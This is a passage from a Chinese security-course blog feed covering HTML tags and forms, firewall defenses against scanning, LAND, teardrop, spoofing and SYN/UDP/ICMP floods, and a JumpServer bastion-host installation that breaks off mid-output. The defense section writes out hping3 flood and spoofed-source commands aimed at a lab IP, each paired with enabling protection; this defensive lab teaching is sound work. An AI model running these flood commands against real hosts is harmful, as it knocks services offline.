class="line">&lt;h6&gt;六级标题&lt;/h6&gt;</span><br></pre></td></tr></table></figure></code></pre></li></ul><p><strong>段落标签</strong></p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">p</span>&gt;</span>段落文本<span class="tag">&lt;/<span class="name">p</span>&gt;</span></span><br></pre></td></tr></table></figure><p><strong>普通文本路径</strong></p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">span</span>&gt;</span>行分区标签，用于对特殊文本特殊处理<span class="tag">&lt;/<span class="name">span</span>&gt;</span></span><br></pre></td></tr></table></figure><p><strong>格式标签</strong></p><ul><li>浏览器会忽略代码中的换行和空格，只显示为一个空格。想要实现页面中的换行，需要借助于换行标签</li></ul><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">br</span>&gt;</span></span><br></pre></td></tr></table></figure><p><strong>字符实体</strong></p><ul><li>某些情况下，浏览器会将一些特殊字符按照HTML的方式解析，影响显示结果。此时需要将这类字符转换为其他的形式书写</li></ul><figure class="highlight properties"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="attr">使用&amp;lt</span>  <span class="string">在页面中呈现&quot;&lt;&quot;</span></span><br><span class="line"><span class="attr">使用&amp;gt</span>  <span class="string">在页面中呈现&quot;&gt;&quot;</span></span><br><span class="line"><span class="attr">使用&amp;nbsp</span>  <span class="string">在页面中呈现一个空格</span></span><br><span class="line"><span class="attr">使用&amp;copy</span>  <span class="string">在页面中呈现版权符号</span></span><br><span class="line"><span class="attr">使用&amp;yen</span>  <span class="string">在页面中呈现人民币符号&quot;￥&quot;</span></span><br></pre></td></tr></table></figure><h3 id="容器标签"><a href="#容器标签" class="headerlink" title="容器标签"></a>容器标签</h3><p><strong>常用与页面结构划分，结合CSS实现网页布局</strong></p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">div</span> <span class="attr">id</span>=<span class="string">&quot;top&quot;</span>&gt;</span>页面顶部区域<span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">div</span> <span class="attr">id</span>=<span class="string">&quot;main&quot;</span>&gt;</span>页面主体区域<span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">div</span> <span class="attr">id</span>=<span class="string">&quot;bottom&quot;</span>&gt;</span>页面底部区域<span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br></pre></td></tr></table></figure><h3 id="图片和超链接标签"><a href="#图片和超链接标签" class="headerlink" title="图片和超链接标签"></a>图片和超链接标签</h3><p><strong>图片标签</strong></p><ul><li>用于在网页中插入一张图片</li><li>属性src用于设置图片的url，必填属性</li><li>width&#x2F;height用于设置图片尺寸，取像素值，默认按原始尺寸显示</li><li>属性title用于设置鼠标悬停在图片上的显示</li><li>属性alt用于设置图片加载失败后的提示文本</li></ul><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">img</span> <span class="attr">src</span>=<span class="string">&quot;&quot;</span> <span class="attr">width</span>=<span class="string">&quot;&quot;</span> <span class="attr">height</span>=<span class="string">&quot;&quot;</span> <span class="attr">title</span>=<span class="string">&quot;&quot;</span> <span class="attr">alt</span>=<span class="string">&quot;&quot;</span>&gt;</span></span><br></pre></td></tr></table></figure><p><strong>超链接标签</strong></p><ul><li>实现跳转到其他页面</li><li>属性href用于设置目标文件的url，必填</li><li>属性target用于设置目标文件的打开方式</li></ul><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">a</span> <span class="attr">href</span>=<span class="string">&quot;https://www.taobao.com&quot;</span> <span class="attr">target</span>=<span class="string">&quot;_self&quot;</span>&gt;</span>淘宝<span class="tag">&lt;/<span class="name">a</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">a</span> <span class="attr">href</span>=<span class="string">&quot;https://www.baidu.com&quot;</span> <span class="attr">target</span>=<span class="string">&quot;_blank&quot;</span>&gt;</span>百度<span class="tag">&lt;/<span class="name">a</span>&gt;</span></span><br></pre></td></tr></table></figure><p><strong>图片链接案例</strong></p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">a</span> <span class="attr">href</span>=<span class="string">&quot;www.baidu.com&quot;</span> <span class="attr">target</span>=<span class="string">&quot;_blank&quot;</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">img</span> <span class="attr">src</span>=<span class="string">&quot;&quot;</span> <span class="attr">width</span>=<span class="string">&quot;&quot;</span> <span class="attr">height</span>=<span class="string">&quot;&quot;</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">a</span>&gt;</span></span><br></pre></td></tr></table></figure><ul><li>黑客常用图片吸引用户点击，背后可能是恶意的链接</li><li>黑客常常利用超级链接跳转到非法网站</li></ul><h2 id="HTML表单"><a href="#HTML表单" class="headerlink" title="HTML表单"></a>HTML表单</h2><h3 id="HTML表单-1"><a href="#HTML表单-1" class="headerlink" title="HTML表单"></a>HTML表单</h3><ul><li>表单用于采集用户的信息并提交给服务器</li><li>由表单元素和表单控件组成</li><li>表单form负责提交数据给服务器</li><li>表单控件负责收集数据</li></ul><h3 id="表单标签"><a href="#表单标签" class="headerlink" title="表单标签"></a>表单标签</h3><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">form</span> <span class="attr">action</span>=<span class="string">&quot;&quot;</span> <span class="attr">method</span>=<span class="string">&quot;&quot;</span> <span class="attr">enctype</span>=<span class="string">&quot;&quot;</span>&gt;</span></span><br><span class="line">    <span class="comment">&lt;!-- 此处为表单控件 --&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">form</span>&gt;</span></span><br></pre></td></tr></table></figure><table><thead><tr><th align="center">属性名</th><th align="center">取值</th></tr></thead><tbody><tr><td align="center">action</td><td align="center">设置数据的提交地址</td></tr><tr><td align="center">method</td><td align="center">设置数据的提交方式，默认为get方式，可以设置为post</td></tr><tr><td align="center">enctype</td><td align="center">设置数据的编码类型，涉及文件上传，必须设置数据的提交方式为post，编码类型为”multipart&#x2F;form-data”</td></tr></tbody></table><h3 id="表单控件"><a href="#表单控件" class="headerlink" title="表单控件"></a>表单控件</h3><p><strong>表单控件用于采集用户信息，常用控件如下</strong></p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">&quot;text&quot;</span>&gt;</span> 文本框</span><br><span class="line">&lt;inputtype=&quot;password&quot;&gt;密码框</span><br><span class="line"><span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">&quot;radio&quot;</span>&gt;</span> 单选按钮</span><br><span class="line"><span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">&quot;checkbox&quot;</span>&gt;</span> 复选框</span><br><span class="line"><span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">&quot;file&quot;</span>&gt;</span> 文件上传</span><br><span class="line"><span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">&quot;button&quot;</span>&gt;</span>普通按钮</span><br><span class="line"><span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">&quot;submit&quot;</span>&gt;</span> 提交按钮</span><br><span class="line"><span class="tag">&lt;<span class="name">select</span>&gt;</span><span class="tag">&lt;/<span class="name">select</span>&gt;</span> 下拉菜单</span><br><span class="line"><span class="tag">&lt;<span class="name">option</span>&gt;</span><span class="tag">&lt;/<span class="name">option</span>&gt;</span> 下拉菜单选项</span><br><span class="line"><span class="tag">&lt;<span class="name">textarea</span>&gt;</span><span class="tag">&lt;/<span class="name">textarea</span>&gt;</span>文本域</span><br></pre></td></tr></table></figure><p><strong>表单控件在Web中的重要性</strong></p><ul><li>表单控件是用户与服务器交互的重要途径</li><li>黑客可以利用表单向服务器提交恶意数据</li></ul><h3 id="表单控件标签"><a href="#表单控件标签" class="headerlink" title="表单控件标签"></a>表单控件标签</h3><p><strong>表单控件标签属性如下表所示</strong></p><table><thead><tr><th align="center">属性名</th><th align="center">取值</th></tr></thead><tbody><tr><td align="center">type</td><td align="center">设置控件类型</td></tr><tr><td align="center">name</td><td align="center">设置控件名称，最终与值一并发送给服务器</td></tr><tr><td align="center">value</td><td align="center">设置控件的值</td></tr><tr><td align="center">placeholder</td><td align="center">设置输入框中的提示文本</td></tr><tr><td align="center">checked</td><td align="center">设置单选按钮或复选按钮的默认选中</td></tr><tr><td align="center">selected</td><td align="center">设置下拉菜单的默认选中</td></tr></tbody></table><h3 id="iframe"><a href="#iframe" class="headerlink" title="iframe"></a>iframe</h3><ul><li>iframe可以实现在一个网页中嵌入另一个网页</li><li>在需要将其他的网站的内容，添加到自己的网站中使用iframe</li><li>iframe标签</li></ul><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">iframe</span> <span class="attr">src</span>=<span class="string">&quot;&quot;</span>&gt;</span><span class="tag">&lt;/<span class="name">iframe</span>&gt;</span></span><br></pre></td></tr></table></figure><ul><li>iframe使用案例</li></ul><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;!doctype <span class="keyword">html</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">html</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">head</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">title</span>&gt;</span>Document<span class="tag">&lt;/<span class="name">title</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">meta</span> <span class="attr">chatset</span>=<span class="string">&quot;utf-8&quot;</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">head</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">body</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">h3</span> <span class="attr">style</span>=<span class="string">&quot;text-align:center&quot;</span>&gt;</span>新闻浏览<span class="tag">&lt;/<span class="name">h3</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">iframe</span> <span class="attr">width</span>=<span class="string">&quot;100%&quot;</span> <span class="attr">height</span>=<span class="string">&quot;500px&quot;</span> <span class="attr">style</span>=<span class="string">&quot;border:0&quot;</span> <span class="attr">src</span>=<span class="string">&quot;https://www.163.com&quot;</span> <span class="attr">frameborder</span>=<span class="string">&quot;0&quot;</span>&gt;</span><span class="tag">&lt;/<span class="name">iframe</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">body</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">html</span>&gt;</span></span><br></pre></td></tr></table></figure><ul><li>iframe使用案例效果</li></ul><p><img src="/../img/img_artical/net_sec/12.1.3.png" alt="12.1.3"></p>]]></content>
      
      
      <categories>
          
          <category> 网络安全（更新ing） </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Web应用基础 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>网络安全-网络安全防御4</title>
      <link href="/posts/secdef4.html"/>
      <url>/posts/secdef4.html</url>
      
        <content type="html"><![CDATA[<h1 id="网络安全防御"><a href="#网络安全防御" class="headerlink" title="网络安全防御"></a>网络安全防御</h1><h2 id="单包攻击与防御"><a href="#单包攻击与防御" class="headerlink" title="单包攻击与防御"></a>单包攻击与防御</h2><h3 id="什么是单包攻击"><a href="#什么是单包攻击" class="headerlink" title="什么是单包攻击"></a>什么是单包攻击</h3><ul><li>DoS是Denial of Service的简称，即拒绝服务。造成DoS的攻击行为被称为DoS攻击，其目的是使计算机或网络无法正常提供服务</li><li>最常见DoS攻击就是单包攻击，一般以个人为单位的攻击者发动的，攻击报文比较单一</li></ul><h3 id="常见的单包攻击"><a href="#常见的单包攻击" class="headerlink" title="常见的单包攻击"></a>常见的单包攻击</h3><ul><li>扫描类攻击：是一种潜在的攻击行为，并不造成直接的破坏结果，通常是攻击者发动真正攻击前的网络探测行为</li><li>畸形报文攻击：通常指攻击者发送大量有缺陷的报文，从而造成被攻击的系统在处理这类报文时耗费资源或崩溃</li><li>特殊控制类报文攻击：也是一种潜在的攻击行为，并不造成直接的破坏结果，攻击者通过发送特殊控制报文探测网络结构，为后续发动真正的攻击做准备</li></ul><h3 id="扫描类攻击防御"><a href="#扫描类攻击防御" class="headerlink" title="扫描类攻击防御"></a>扫描类攻击防御</h3><ul><li>防火墙防御扫描攻击时，某个源IP地址连续发送报文时，如果该IP发送的报文的目的地址&#x2F;端口与其发送的前一个报文不同，则记为一次异常</li><li>当异常次数超过预定义的值，则认为该源IP正在进行扫描攻击，防火墙会将该源IP地址加入黑名单，后续收到来自该源IP地址的报文时，直接告警或丢弃</li><li>此类防御比较耗防火墙资源，不建议长期开启</li></ul><h3 id="防御nmap扫描"><a href="#防御nmap扫描" class="headerlink" title="防御nmap扫描"></a>防御nmap扫描</h3><ul><li>“攻击机” 扫瞄 “靶机”进行IP地址扫描、端口扫描</li><li>扫描到2个主机、大量端口</li></ul><p><img src="/../img/img_artical/net_sec/11.4.1.png" alt="11.4.1"></p><p><strong>配置扫描类攻击防范</strong></p><ul><li>开启IP地址扫描和端口扫描防范，配置最大扫描速率40，应用</li><li>开启黑名单，应用</li></ul><p><img src="/../img/img_artical/net_sec/11.4.2.png" alt="11.4.2"></p><p><strong>验证</strong></p><ul><li>开始可以正常ping通</li><li>扫描IP地址和扫描端口不成功</li><li>被加入黑名单后，无法ping通</li></ul><p><img src="/../img/img_artical/net_sec/11.4.3.png" alt="11.4.3"></p><p><strong>查看威胁日志</strong></p><ul><li>发现 “port scan attack” 和 “ip sweep attack” 攻击</li></ul><p><img src="/../img/img_artical/net_sec/11.4.4.png" alt="11.4.4"></p><h3 id="LAND攻击"><a href="#LAND攻击" class="headerlink" title="LAND攻击"></a>LAND攻击</h3><p><strong>LAND攻击方式采用了特别构造的TCP SYN数据包，使目标机器开启一个源地址与目标地址均为自身IP地址的空连接，持续地自我应答，消耗系统资源直至崩溃</strong></p><p><strong>hping3 192.168.30.10 -p 445 –syn -a 192.168.30.10 –flood</strong></p><ul><li>-p：端口</li><li>–syn：发送SYN</li><li>-a：伪造源地址</li><li>–flood：泛洪，持续尽快攻击</li></ul><h3 id="防御LAND攻击"><a href="#防御LAND攻击" class="headerlink" title="防御LAND攻击"></a>防御LAND攻击</h3><p><strong>执行攻击，抓包发现源地址和目的地址相同，目标资源消耗很大</strong></p><ul><li>hping3 192.168.30.10 -p 445 –syn -a 192.168.30.10 –flood</li></ul><p><img src="/../img/img_artical/net_sec/11.4.5.png" alt="11.4.5"></p><ul><li>开启LAND攻击防范，目标主动资源占用恢复正常</li><li>查看“威胁日志”，发现’Land attack’威胁</li></ul><p><img src="/../img/img_artical/net_sec/11.4.6.png" alt="11.4.6"></p><p><img src="/../img/img_artical/net_sec/11.4.7.png" alt="11.4.7"></p><h3 id="泪滴攻击"><a href="#泪滴攻击" class="headerlink" title="泪滴攻击"></a>泪滴攻击</h3><p><strong>泪滴攻击（TearDrop）指的是向目标机器发送损坏的IP包，诸如重叠的包或过大的包载荷。借由这些手段，该攻击可以通过TCP&#x2F;IP协议栈中分片重组代码中的bug来瘫痪各种不同的操作系统</strong></p><p><strong>hping3 192.168.30.10 -p 445 –syn -d 666666 –flood</strong></p><ul><li>-p：端口</li><li>–syn：发送SYN</li><li>-d：指定数据包大小（大于65535）</li><li>–flood：泛洪，持续尽快攻击</li></ul><h3 id="防御泪滴攻击"><a href="#防御泪滴攻击" class="headerlink" title="防御泪滴攻击"></a>防御泪滴攻击</h3><p><strong>执行攻击，抓包无法响应，目标网络资源消耗很大</strong></p><ul><li>hping3 192.168.30.10 -p 445 –syn -d 666666 –flood</li></ul><p><img src="/../img/img_artical/net_sec/11.4.8.png" alt="11.4.8"></p><p><strong>开启Teardrop攻击防范，目标主动资源占用恢复正常</strong></p><p><img src="/../img/img_artical/net_sec/11.4.9.png" alt="11.4.9"></p><p><strong>查看威胁日志，发现teardrop attack威胁</strong></p><p><img src="/../img/img_artical/net_sec/11.4.10.png" alt="11.4.10"></p><h3 id="IP地址欺骗"><a href="#IP地址欺骗" class="headerlink" title="IP地址欺骗"></a>IP地址欺骗</h3><p><strong>IP地址欺骗是指伪造IP数据包的源IP地址进行攻击，如果使用随机源地址使目标无法追溯</strong></p><p><strong>hping3 192.168.30.10 -p 445 –syn –rand-source –flood</strong></p><ul><li>-p：端口</li><li>–syn：发送SYN</li><li>–rand-source：随机源地址</li><li>–flood：泛洪，持续尽快攻击</li></ul><h3 id="防御IP地址欺骗攻击"><a href="#防御IP地址欺骗攻击" class="headerlink" title="防御IP地址欺骗攻击"></a>防御IP地址欺骗攻击</h3><p><strong>执行攻击，抓包发现很多随机IP地址，目标系统资源消耗很大</strong></p><p><strong>hping3 192.168.30.10 -p 445 –syn –rand-source –flood</strong></p><p><img src="/../img/img_artical/net_sec/11.4.11.png" alt="11.4.11"></p><p><strong>开启“IP欺骗攻击防范”，目标主动资源占用恢复正常</strong></p><p><img src="/../img/img_artical/net_sec/11.4.12.png" alt="11.4.12"></p><p><strong>查看威胁日志，发现ip spoof attack</strong></p><p><img src="/../img/img_artical/net_sec/11.4.13.png" alt="11.4.13"></p><h2 id="流量攻击与防御"><a href="#流量攻击与防御" class="headerlink" title="流量攻击与防御"></a>流量攻击与防御</h2><h3 id="什么是流量攻击"><a href="#什么是流量攻击" class="headerlink" title="什么是流量攻击"></a>什么是流量攻击</h3><ul><li>流量攻击一般是指DDoS攻击</li><li>DDoS（Distributed Denialof Service）攻击是指攻击者通过控制大量的僵尸主机（俗称“肉鸡”），向被攻击目标发送大量精心构造的攻击报文造成被攻击者所在网络的链路拥塞、系统资源耗尽</li></ul><p></p><h3 id="常见的流量攻击"><a href="#常见的流量攻击" class="headerlink" title="常见的流量攻击"></a>常见的流量攻击</h3><ul><li><p>SYN Flood攻击是利用TCP协定缺陷，向目标主机发送大量伪造源地址SYN报文，受害主机无法收到ACK报文，致使目标主机存在大量的半连接从而消耗主机资源</p></li><li><p>UDPFlood攻击属于带宽类攻击，攻击者通过僵尸主机向目标服务器发送大量UDP报文，这种UDP报文的字节数很大且速率非常快，通常会消耗网络带宽资源，严重时造成链路拥塞</p></li><li><p>ICMP Flood攻击，该攻击在短时间内向目的主机发送大量ping包，消耗主机资源</p></li><li><p>DNS Flood攻击指的是攻击者向DNS服务器发送大量的不存在的域名解析请求，导致DNS服务器瘫痪，无法处理正常的域名解析请求。</p></li><li><p>HTTPFlood攻击，攻击者控制僵尸主机向目标服务器发送大量的HTTP请求报文，这些请求报文中一般都包含涉及消耗系统资源的URI（统一资源标识符），从而消耗目标服务器资源，无法响应正常请求</p></li></ul><h3 id="SYN-Flood攻击"><a href="#SYN-Flood攻击" class="headerlink" title="SYN Flood攻击"></a>SYN Flood攻击</h3><p><strong>执行攻击，目标资源占用上升，抓包发现大量的SYN报文</strong></p><ul><li>hping3 192.168.30.10 –syn -p 80 –rand-source –flood</li></ul><p><img src="/../img/img_artical/net_sec/11.4.14.png" alt="11.4.14"></p><h3 id="防御SYN-Flood攻击"><a href="#防御SYN-Flood攻击" class="headerlink" title="防御SYN Flood攻击"></a>防御SYN Flood攻击</h3><ul><li>源探测：</li><li>启动TCP源探测后，防火墙收到SYN报文，将会回应一个带有错误确认号的SYN+ACK报文，接下来如果防火墙没有收到客户端回应的RST报文，则判定此SYN报文为非正常报文，客户端为虚假源</li><li>启用 SYN Flood攻击防范，设置值为20，目标主机资源占用恢复正常（内存占用高，为Wireshark占用）</li></ul><p><img src="/../img/img_artical/net_sec/11.4.15.png" alt="11.4.15"></p><ul><li>查看威胁日志存在“Synflood attack”威胁</li></ul><p><img src="/../img/img_artical/net_sec/11.4.16.png" alt="11.4.16"></p><h3 id="UDP-Flood攻击"><a href="#UDP-Flood攻击" class="headerlink" title="UDP Flood攻击"></a>UDP Flood攻击</h3><p><strong>执行攻击，目标资源消耗上升，抓包发现大量UDP报文</strong></p><ul><li>hping3 192.168.30.10 –udp -p 80 –rand-source –flood</li><li>注：非常消耗防火墙资源，可能把防火墙打瘫（需要重启外网口）</li></ul><p><img src="/../img/img_artical/net_sec/11.4.17.png" alt="11.4.17"></p><h3 id="防御UDP-Flood攻击"><a href="#防御UDP-Flood攻击" class="headerlink" title="防御UDP Flood攻击"></a>防御UDP Flood攻击</h3><ul><li><p>防火墙防御UDP Flood攻击主要有两种方式：限流和指纹学习</p></li><li><p>限流方式属于暴力型，可以很快将UDP流量限制在一个合理的范围内，可能会丢弃正常报文</p></li><li><p>指纹学习属于理智型，不会随意丢弃报文，但是发生攻击后需要有一个指纹学习的过程</p></li><li><p>启用UDP Flood攻击防御，设置指纹防范、限流闽值为5</p></li><li><p>目标资源消耗正常（内存占用高，为Wireshark占用）</p></li></ul><p><img src="/../img/img_artical/net_sec/11.4.18.png" alt="11.4.18"></p><ul><li>查看威胁日志存在“Udp flood attack”威胁</li></ul><p><img src="/../img/img_artical/net_sec/11.4.19.png" alt="11.4.19"></p><h3 id="ICMP-Flood攻击"><a href="#ICMP-Flood攻击" class="headerlink" title="ICMP Flood攻击"></a>ICMP Flood攻击</h3><p><strong>执行攻击，目标资源占用上升，抓包发现大量的ICMP报文</strong></p><ul><li>hping3 192.168.30.10 –icmp -p 80 –rand-source –flood</li></ul><p><img src="/../img/img_artical/net_sec/11.4.20.png" alt="11.4.20"></p><h3 id="防御ICMP-Flood攻击"><a href="#防御ICMP-Flood攻击" class="headerlink" title="防御ICMP Flood攻击"></a>防御ICMP Flood攻击</h3><ul><li><p>对ICMP数据包进行带宽限制，将ICMP占用的带宽控制在一定的范围内，这样即使有ICMP攻击，造成的影响较小</p></li><li><p>启用ICMP Flood攻击防御，设置限流闻值为20</p></li><li><p>目标资源消耗正常（内存占用高，为Wireshark占用）</p></li></ul><p><img src="/../img/img_artical/net_sec/11.4.21.png" alt="11.4.21"></p><ul><li>查看威胁日志存在“lcmpflood attack limit”威胁</li></ul><p><img src="/../img/img_artical/net_sec/11.4.22.png" alt="11.4.22"></p>]]></content>
      
      
      <categories>
          
          <category> 网络安全（更新ing） </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 网络安全防御 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>网络安全-网络安全防御3</title>
      <link href="/posts/secdef3.html"/>
      <url>/posts/secdef3.html</url>
      
        <content type="html"><![CDATA[<h1 id="网络安全防御"><a href="#网络安全防御" class="headerlink" title="网络安全防御"></a>网络安全防御</h1><h2 id="运维审计系统-堡垒机"><a href="#运维审计系统-堡垒机" class="headerlink" title="运维审计系统-堡垒机"></a>运维审计系统-堡垒机</h2><h3 id="为什么需要堡垒机"><a href="#为什么需要堡垒机" class="headerlink" title="为什么需要堡垒机"></a>为什么需要堡垒机</h3><p><strong>网络安全等级保护“安全管理中心”要求</strong></p><ul><li>应对系统管理员进行身份鉴别，只允许其通过特定的命令或操作界面进行系统管理操作，并对这些操作进行审计</li><li>应通过审计管理员对审计记录应进行分析,并根据分析结果进行处理,包括根据安全审计策略对审计记录进行存储、管理和查询等</li></ul><p><img src="/../img/img_artical/net_sec/11.3.1.png" alt="11.3.1"></p><h3 id="什么是堡垒机"><a href="#什么是堡垒机" class="headerlink" title="什么是堡垒机"></a>什么是堡垒机</h3><p><strong>运维安全管理与审计系统，又称堡垒机，提供的运维和安全审计管控平台解决资产多难管理、运维职责权限不清晰以及运维事件难追溯等问题，助力企业满足等保合规需求</strong></p><ul><li>集中管理运维权限</li><li>全程管控操作行为</li><li>实时还原运维场景</li><li>保障运维行为身份可鉴别</li><li>权限可管控、操作可审计</li></ul><p><img src="/../img/img_artical/net_sec/11.3.2.png" alt="11.3.2"></p><h3 id="堡垒机厂商"><a href="#堡垒机厂商" class="headerlink" title="堡垒机厂商"></a>堡垒机厂商</h3><ul><li>启明星辰-天明运维安全网关</li><li>安恒-明御运维审计与风险控制系统</li><li>天融信-运维安全审计系统</li><li>绿盟-运维安全管理系统OSMS</li><li>飞致云-JumpServer开源堡垒机</li></ul><h3 id="JumpServer堡垒机介绍"><a href="#JumpServer堡垒机介绍" class="headerlink" title="JumpServer堡垒机介绍"></a>JumpServer堡垒机介绍</h3><p><strong>JumpServer堡垒机</strong></p><ul><li>开源堡垒机，符合4A规范的专业运维安全审计系统</li><li>配备Web Terminal方案，交互界面美观、用户体验好</li><li>采纳分布式架构，支持横向扩展，无资产数量及并发限制</li></ul><p><strong>4A</strong></p><ul><li>身份验证&#x2F;Authentication，防止身份冒用和复用</li><li>授权控制&#x2F;Authorization，防止内部误操作和权限滥用</li><li>账号管理&#x2F;Accounting，人员和资产的管理</li><li>安全审计&#x2F;Auditing，追溯的保障和事故分析的依据</li></ul><h2 id="部署堡垒机"><a href="#部署堡垒机" class="headerlink" title="部署堡垒机"></a>部署堡垒机</h2><h3 id="准备openEuler系统"><a href="#准备openEuler系统" class="headerlink" title="准备openEuler系统"></a>准备openEuler系统</h3><p><strong>硬件环境：</strong></p><ul><li>2个CPU核心</li><li>2G内存</li><li>100G硬盘</li></ul><p><strong>系统环境：</strong></p><ul><li>openEuler-22.03</li></ul><h3 id="下载离线安装包"><a href="#下载离线安装包" class="headerlink" title="下载离线安装包"></a>下载离线安装包</h3><p><strong>在jumpServer官网下载社区版安装包</strong></p><p><img src="/../img/img_artical/net_sec/11.3.3.png" alt="11.3.3"></p><h3 id="上传安装包至Linux系统"><a href="#上传安装包至Linux系统" class="headerlink" title="上传安装包至Linux系统"></a>上传安装包至Linux系统</h3><p><strong>利用MobaXterm工具上传安装包到&#x2F;opt目录下</strong></p><p><img src="/../img/img_artical/net_sec/11.3.4.png" alt="11.3.4"></p><h3 id="在Linux中解压安装包"><a href="#在Linux中解压安装包" class="headerlink" title="在Linux中解压安装包"></a>在Linux中解压安装包</h3><p><strong>切换到&#x2F;opt&#x2F;下</strong></p><figure class="highlight properties"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="attr">[root@JumpServer</span> <span class="string">~]# cd /opt/</span></span><br></pre></td></tr></table></figure><p><strong>解压离线安装包</strong></p><figure class="highlight properties"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="attr">[root@JumpServer</span> <span class="string">opt]# tar -xf jumpserver-offline-installer-v2.28.6-amd64-179.tar.gz</span></span><br></pre></td></tr></table></figure><p><strong>切换到&#x2F;opt&#x2F;jumpserver-offline-install-v2.28.6-amd64-179目录</strong></p><figure class="highlight properties"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="attr">[root@JumpServer</span> <span class="string">opt]# cd jumpserver-offline-installer-v2.28.6-amd64-179</span></span><br></pre></td></tr></table></figure><h3 id="在Linux中安装JumpServer"><a href="#在Linux中安装JumpServer" class="headerlink" title="在Linux中安装JumpServer"></a>在Linux中安装JumpServer</h3><p><strong>执行安装</strong></p><figure class="highlight properties"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="attr">[root@JumpServer</span> <span class="string">jumpserver-offline-installer-v2.28.6-amd64-179]# ./jmsctl.sh install</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">       <span class="attr">██╗██╗</span>   <span class="string">██╗███╗   ███╗██████╗ ███████╗███████╗██████╗ ██╗   ██╗███████╗██████╗</span></span><br><span class="line">       <span class="attr">██║██║</span>   <span class="string">██║████╗ ████║██╔══██╗██╔════╝██╔════╝██╔══██╗██║   ██║██╔════╝██╔══██╗</span></span><br><span class="line">       <span class="attr">██║██║</span>   <span class="string">██║██╔████╔██║██████╔╝███████╗█████╗  ██████╔╝██║   ██║█████╗  ██████╔╝</span></span><br><span class="line">  <span class="attr">██</span>   <span class="string">██║██║   ██║██║╚██╔╝██║██╔═══╝ ╚════██║██╔══╝  ██╔══██╗╚██╗ ██╔╝██╔══╝  ██╔══██╗</span></span><br><span 